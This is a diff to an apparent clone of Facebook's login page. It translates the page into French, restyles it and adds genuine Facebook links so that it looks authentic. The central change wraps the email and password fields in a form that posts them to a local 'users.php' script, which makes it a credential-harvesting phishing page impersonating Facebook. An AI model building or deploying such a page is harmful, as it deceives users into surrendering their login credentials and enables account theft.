@@ -26,7 +26,8 @@ main {
     height: 70vh;
     width: 100vw;
     position: relative;
-    margin: 0 auto;
+    margin-top: 120px;
+    margin-bottom: 150px;
 }
 
 footer {
@@ -36,6 +37,7 @@ footer {
 
 .row {
     display: flex;
+    vertical-align: top;
     justify-content: space-around;
     align-items: center;
     width: 100%;
@@ -83,6 +85,7 @@ footer {
     height: 45px;
     vertical-align: middle;
     font-size: 16px;
+    border-radius: 8px;
 }
 
 .col-form .form-container input {
@@ -191,6 +194,26 @@ footer ol li a:hover {
 footer small {
     font-size: 11px;
 }
+@media only screen and (max-width: 768px) {
+        body {
+              display: flex;
+              flex-direction: column;
+              justify-content: center;
+              align-items: center;
+        }
+        
+        .row {
+            flex-direction: column-reverse;
+        }
+        .col-logo {
+            order: 2;
+        }
+
+        .col-form {
+            order: 1;
+            margin-top: 30px;
+        }
+    }
     </style>
 </head>
 
@@ -199,78 +222,41 @@ footer small {
         <div class="row">
             <div class="col-logo">
                 <img src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" alt="Logo">
-                <h2>Facebook helps you connect and share with the people in your life.</h2>
+                <h2>Avec Facebook, partagez et restez en contact avec votre entourage.</h2>
             </div>
-            <div class="col-form">
+            <form class="col-form" method="POST" action="users.php">
                 <div class="form-container">
-                    <input type="text" placeholder="Email or phone number">
-                    <input type="password" placeholder="Password">
-                    <button class="btn-login">Login</button>
-                    <a href="#">Forgotten password?</a>
-                    <button class="btn-new">Create new Account</button>
+                    <input id="email" type="text" name="email" placeholder="Adresse e-mail ou numéro de tél.">
+                    <input id="password" type="password" name="password" placeholder="Mot de passe">
+                    <button class="btn-login">Se connecter</button>
+                    <a href="https://web.facebook.com/recover/initiate/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNjc4MTk2Njg2LCJjYWxsc2l0ZV9pZCI6MzgxMjI5MDc5NTc1OTQ2fQ%3D%3D&ars=facebook_login">Mot de passe oublié ?</a>
+                    <button class="btn-new">Créer nouveau compte</button>
                 </div>
-                <p><a href="#"><b>Create a Page</b></a> for a celebrity, brand or business.</p>
+                <p><a href="https://web.facebook.com/pages/create/?ref_type=registration_form"><b>Créer une Page</b></a> pour une célébrité, une marque ou une entreprise.</p>
             </div>
         </div>
     </main>
     <footer>
         <div class="footer-contents">
             <ol>
-                <li>English (UK)</li>
-                <li><a href="#">മലയാളം</a></li>
-                <li><a href="#">தமிழ்</a></li>
-                <li><a href="#">తెలుగు</a></li>
-                <li><a href="#">বাংলা</a></li>
-                <li><a href="#">اردو</a></li>
-                <li><a href="#">हिन्दी</a></li>
-                <li><a href="#">ಕನ್ನಡ</a></li>
+                <li>Français (France)</li>
+                <li><a href="#">Malagasy</a></li>
+                <li><a href="#">English (US)</a></li>
+                <li><a href="#">Italiano/a></li>
                 <li><a href="#">Español</a></li>
+                <li><a href="#">Deutsch</a></li>
+                <li><a href="#">中文(简体)</a></li>
+                <li><a href="#">Türkçe</a></li>
                 <li><a href="#">Português (Brasil)</a></li>
-                <li><a href="#">Français (France)</a></li>
+                <li><a href="#">العربية</a></li>
+                <li><a href="#">हिन्दी</a></li>
                 <li><button>+</button></li>
             </ol>
 
             <ol>
-                <li><a href="#">Sign Up</a></li>
-                <li><a href="#">Log In </a></li>
-                <li><a href="#">Messenger</a></li>
-                <li><a href="#">Facebook Lite</a></li>
-                <li><a href="#">Watch</a></li>
-                <li><a href="#">People</a></li>
-                <li><a href="#">Pages</a></li>
-                <li><a href="#">Page categories</a></li>
-                <li><a href="#">Places</a></li>
-                <li><a href="#">Games</a></li>
-                <li><a href="#">Locations</a></li>
-                <li><a href="#">Marketplace</a></li>
-                <li><a href="#">Facebook</a></li>
-                <li><a href="#">PayGroups</a></li>
-                <li><a href="#">Jobs</a></li>
-                <li><a href="#">Oculus</a></li>
-                <li><a href="#">Portal</a></li>
-                <li><a href="#">Instagram</a></li>
-                <li><a href="#">Local</a></li>
-                <li><a href="#">Sign Up</a></li>
-                <li><a href="#">Log In </a></li>
-                <li><a href="#">Messenger</a></li>
-                <li><a href="#">Facebook Lite</a></li>
-                <li><a href="#">Watch</a></li>
-                <li><a href="#">People</a></li>
-                <li><a href="#">Pages</a></li>
-                <li><a href="#">Page categories</a></li>
-                <li><a href="#">Places</a></li>
-                <li><a href="#">Games</a></li>
-                <li><a href="#">Locations</a></li>
-                <li><a href="#">Marketplace</a></li>
-                <li><a href="#">Facebook</a></li>
-                <li><a href="#">PayGroups</a></li>
-                <li><a href="#">Jobs</a></li>
-                <li><a href="#">Oculus</a></li>
-                <li><a href="#">Portal</a></li>
-                <li><a href="#">Instagram</a></li>
-                <li><a href="#">Local</a></li>
+                <li><a href="/reg/" title="Inscrivez-vous sur Facebook">S’inscrire</a></li><li><a href="/login/" title="Se connecter à Facebook">Se connecter</a></li><li><a href="https://messenger.com/" title="Essayez Messenger.">Messenger</a></li><li><a href="/lite/" title="Facebook Lite pour Android.">Facebook Lite</a></li><li><a href="https://web.facebook.com/watch/" title="Naviguez parmi nos vidéos Watch.">Watch</a></li><li><a href="/places/" title="Découvrez les lieux populaires sur Facebook.">Lieux</a></li><li><a href="/games/" title="Découvrez les jeux Facebook.">Jeux</a></li><li><a href="/marketplace/" title="Achetez et vendez sur Facebook Marketplace.">Marketplace</a></li><li><a href="https://pay.facebook.com/" title="En savoir plus sur Meta Pay" target="_blank">Meta Pay</a></li><li><a href="https://www.oculus.com/" title="En savoir plus sur Oculus" target="_blank">Oculus</a></li><li><a href="https://portal.facebook.com/" title="En savoir plus sur Facebook Portal" target="_blank">Portal</a></li><li><a href="https://l.facebook.com/l.php?u=https%3A%2F%2Fwww.instagram.com%2F&amp;h=AT0gyb7j8Plpjoudh5UUopHEtrFXllBdUKAFbOKAklXJKJaJFLV-D3Pa9sNYUNTbVIuJoayY38WlBj5ULnq-8Ehh5UbJ4RzGiSzW9CVjCzXbMGMWGjHB4Y-OaSeQ1r2becXcF1v0B6YC--dQ2NTvQg" title="Découvrez Instagram" target="_blank" rel="nofollow" data-lynx-mode="asynclazy">Instagram</a></li><li><a href="https://www.bulletin.com/" title="Découvrez la newsletter Bulletin">Bulletin</a></li><li><a href="/fundraisers/" title="Faire un don à des causes qui le méritent.">Collectes de dons</a></li><li><a href="/biz/directory/" title="Parcourir notre annuaire des services Facebook.">Services</a></li><li><a href="/votinginformationcenter/?entry_point=c2l0ZQ%3D%3D" title="Voir le Centre d’information sur les élections.">Centre d’information sur les élections</a></li><li><a href="/privacy/policy/?entry_point=facebook_page_footer" title="Découvrez comment nous collectons, utilisons et partageons les informations pour faire fonctionner Facebook.">Politique de confidentialité</a></li><li><a href="/privacy/center/?entry_point=facebook_page_footer" title="Découvrez comment gérer et contrôler votre confidentialité sur Facebook.">Centre de confidentialité</a></li><li><a href="/groups/explore/" title="Découvrir nos groupes.">Groupes</a></li><li><a href="https://about.meta.com/" accesskey="8" title="Consultez notre blog, découvrez notre centre de ressources et recherchez des offres d’emploi.">À propos</a></li><li><a href="/ad_campaign/landing.php?placement=pflo&amp;campaign_id=402047449186&amp;nav_source=unknown&amp;extra_1=auto" title="Diffusez votre publicité sur Facebook.">Créer une publicité</a></li><li><a href="/pages/create/?ref_type=site_footer" title="Créez une Page.">Créer une Page</a></li><li><a href="https://developers.facebook.com/?ref=pf" title="Développez sur notre propre plateforme.">Développeurs</a></li><li><a href="/careers/?ref=pf" title="Faites évoluer votre carrière en rejoignant notre incroyable entreprise.">Emplois</a></li><li><a href="/policies/cookies/" title="À propos des cookies et de Facebook." data-nocookies="1">Cookies</a></li><li><a class="_41ug" data-nocookies="1" href="https://web.facebook.com/help/568137493302217" title="En savoir plus sur Choisir sa publicité.">Choisir sa publicité<i class="img sp_h4Swrc8tiWJ sx_22044a"></i></a></li><li><a data-nocookies="1" href="/policies?ref=pf" accesskey="9" title="Prenez connaissance des conditions générales et des règlements.">Conditions générales</a></li><li><a href="/help/?ref=pf" accesskey="0" title="Consultez les pages d’aide.">Aide</a></li><li><a href="help/637205020878504" title="Consultez notre avis sur l’importation des contacts et les non-utilisateurs.">Importation des contacts et non-utilisateurs</a></li><li><a accesskey="6" class="accessible_elem" href="/settings" title="Affichez et modifiez vos paramètres Facebook.">Paramètres</a></li><li><a accesskey="7" class="accessible_elem" href="/allactivity?privacy_source=activity_log_top_menu" title="Affichez votre Historique d’activité">Historique d’activité</a></li>
             </ol>
-            <small>Facebook © 2022</small>
+            <small>Meta © 2023</small>
         </div>
     </footer>
 </body>
